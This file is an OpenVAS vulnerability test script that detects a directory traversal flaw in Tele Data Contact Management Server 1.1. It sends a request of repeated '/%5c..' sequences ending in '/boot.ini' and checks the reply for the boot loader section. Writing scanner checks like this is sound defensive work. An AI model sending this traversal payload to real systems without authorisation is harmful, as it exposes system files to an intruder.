###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tele_data_contact_management_server_dir_trav_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
#
# Tele Data Contact Management Server Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to obtain sensitive
information that could aid in further attacks.

Impact Level: Application";

tag_affected = "Tele Data Contact Management Server version 1.1";

tag_insight = "The flaw is due to improper validation of URI containing '%5c..'
sequences, which allows attackers to read arbitrary files via directory
traversal attacks.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running Tele Data Contact Management Server and is
prone to directory traversal vulnerability.";

if(description)
{
  script_id(801899);
  script_version("$Revision: 7044 $");
  script_bugtraq_id(48114);
  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Tele Data Contact Management Server Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44854");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102015/TeleDataContactManagementServer-traversal.txt");
  script_xref(name : "URL" , value : "http://www.autosectools.com/Advisory/Tele-Data-Contact-Management-Server-Directory-Traversal-231");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TD_Contact_Management_Server/banner");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get Http Banner
banner = get_http_banner(port:port);

## Confirm Application
if("Server: TD Contact Management Server" >< banner)
{
  ## Construct attack request
  url = string(crap(data:"/%5c..",length:6*10),"/boot.ini");

  ## Try exploit and check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:url, pattern:"\[boot loader\]")) {
    security_message(port:port);
  }
}
